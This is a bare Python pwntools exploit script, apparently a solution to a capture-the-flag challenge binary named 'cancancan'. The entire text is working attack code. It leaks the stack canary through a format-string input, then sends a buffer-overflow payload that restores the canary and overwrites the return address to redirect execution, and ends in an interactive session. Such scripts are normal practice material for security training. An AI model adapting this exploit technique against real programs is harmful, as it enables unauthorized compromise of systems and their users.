from pwn import *

p = process('./cancancan')
p.recvuntil(b'bypass me???\n')
p.sendline(b'%31$x')
leak = p.recvline().decode()
log.info("canary value: 0x%s" % leak)

payload = b'a'*100
payload += p32(int(leak, 16))
payload += b'a'*12
payload += p32(0x08049236)

p.sendline(payload)
p.interactive()
